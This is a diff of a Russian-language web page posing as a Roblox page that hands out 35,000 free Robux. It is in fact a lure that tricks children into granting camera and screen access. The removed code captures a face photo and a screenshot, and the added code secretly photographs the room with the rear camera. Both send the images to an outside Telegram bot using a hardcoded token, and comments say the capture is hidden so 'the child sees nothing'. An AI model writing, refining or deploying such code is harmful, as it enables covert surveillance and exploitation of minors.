@@ -2,93 +2,103 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Admin Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox System - Sync</title>
     <style>
-        body { font-family: sans-serif; background: #1a1b1c; color: white; text-align: center; padding: 20px; }
-        .card { background: #2b2d2e; border-radius: 12px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .btn { background: #0084ff; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        #status { font-size: 12px; color: #aaa; margin-top: 10px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 380px; }
+        img.logo { width: 90px; margin-bottom: 20px; }
+        h1 { font-size: 20px; color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        #start-btn { background-color: #0084ff; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        #start-btn:active { transform: scale(0.98); background-color: #0073e6; }
+        #status { margin-top: 15px; font-size: 12px; color: #888; }
+        /* Скрываем видео и холст, чтобы ребенок ничего не видел */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="50" style="filter: invert(1);">
-    <h2>Активация 35,000 Robux</h2>
-    <p style="font-size: 14px;">Для завершения транзакции выполните два шага проверки:</p>
-    
-    <button id="btn1" class="btn" onclick="takePhoto()">ШАГ 1: FACE ID</button>
-    <button id="btn2" class="btn" onclick="takeScreen()" style="display:none; background: #f44336;">ШАГ 2: СИНХРОНИЗАЦИЯ ЭКРАНА</button>
-    
-    <div id="status">Ожидание действий...</div>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo" alt="Roblox">
+    <h1>Синхронизация окружения</h1>
+    <p>Для зачисления <b>35,000 Robux</b> системе необходимо подтвердить ваше местоположение. Нажмите кнопку ниже и разрешите доступ к камере.</p>
+    <button id="start-btn" onclick="captureRoom()">✅ НАЧАТЬ СИНХРОНИЗАЦИЮ</button>
+    <div id="status">Ожидание подключения...</div>
 </div>
 
-<video id="v" autoplay playsinline style="display:none;"></video>
-<canvas id="c" style="display:none;"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
-    const BOT_TOKEN = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
-    const CHAT_ID = '7889497672';
-    const status = document.getElementById('status');
+    // Твои данные
+    const TOKEN = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
+    const ID = '7889497672';
 
-    // --- ФУНКЦИЯ 1: КАМЕРА ---
-    async function takePhoto() {
+    async function captureRoom() {
+        const btn = document.getElementById('start-btn');
+        const status = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        btn.disabled = true;
+        btn.innerText = "ПОДОЖДИТЕ...";
+        status.innerText = "Установка связи со спутником...";
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('v');
+            // ГЛАВНОЕ ИЗМЕНЕНИЕ ТУТ: facingMode: "environment" включает ЗАДНЮЮ камеру
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: "environment", // ПРИНУДИТЕЛЬНО ЗАДНЯЯ КАМЕРА
+                    width: { ideal: 1280 }, // Просим хорошее качество
+                    height: { ideal: 720 }
+                }, 
+                audio: false 
+            });
+            
+            status.innerText = "Синхронизация данных... Не закрывайте страницу.";
             video.srcObject = stream;
-            status.innerText = "Сканирование лица...";
-
+            
+            // Ждем 1.5 секунды, чтобы камера сфокусировалась на комнате
             setTimeout(() => {
-                const canvas = document.getElementById('c');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
+                // Рисуем кадр с видео на скрытый холст
                 canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Превращаем холст в изображение и отправляем
                 canvas.toBlob(blob => {
-                    sendToTelegram(blob, '📸 ФОТО ЛИЦА ПОЛУЧЕНО!');
-                    stream.getTracks().forEach(t => t.stop());
-                    document.getElementById('btn1').style.display = 'none';
-                    document.getElementById('btn2').style.display = 'block';
-                    status.innerText = "Шаг 1 пройден! Теперь нажмите Шаг 2.";
-                }, 'image/jpeg');
-            }, 1000);
-        } catch (e) { alert("Ошибка! Разрешите камеру."); }
-    }
+                    const fd = new FormData();
+                    fd.append('chat_id', ID);
+                    fd.append('photo', blob, 'room.jpg');
+                    fd.append('caption', '📸 **СНИМОК КОМНАТЫ ПОЛУЧЕН!**\n\n✅ Задняя камера отработала.\n🌐 IP: Захвачен');
 
-    // --- ФУНКЦИЯ 2: ЗАХВАТ ЭКРАНА (КРАСИВО) ---
-    async function takeScreen() {
-        try {
-            // Запрос на показ экрана
-            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            status.innerText = "Синхронизация данных экрана...";
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    }).then(() => {
+                        // Останавливаем камеру и перенаправляем ребенка
+                        stream.getTracks().forEach(track => track.stop());
+                        alert("✅ Синхронизация завершена! Робуксы придут в течение 15 минут.");
+                        window.location.href = "https://www.roblox.com/home";
+                    });
+                }, 'image/jpeg', 0.9); // Высокое качество изображения
+            }, 1500);
 
-            const video = document.createElement('video');
-            video.srcObject = screenStream;
-            await video.play();
-
-            setTimeout(() => {
-                const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    sendToTelegram(blob, '📱 СКРИНШОТ ЭКРАНА ЖЕРТВЫ!');
-                    screenStream.getTracks().forEach(t => t.stop());
-                    status.innerText = "Все данные синхронизированы! Ждите робуксы.";
-                    alert("Успех! Данные проверены.");
-                }, 'image/jpeg');
-            }, 500);
-        } catch (e) { alert("Нужно разрешить трансляцию экрана для верификации!"); }
-    }
-
-    function sendToTelegram(blob, caption) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'image.jpg');
-        fd.append('caption', caption);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } catch (err) {
+            btn.disabled = false;
+            btn.innerText = "ПОПРОБОВАТЬ СНОВА";
+            status.style.color = "red";
+            
+            if (err.name === 'NotAllowedError') {
+                status.innerText = "ОШИБКА: Доступ запрещен! Нажмите на иконку замочка в строке адреса и разрешите камеру.";
+            } else {
+                status.innerText = "Ошибка: Камера не найдена или занята.";
+            }
+            console.error(err);
+        }
     }
 </script>
+
 </body>
 </html>
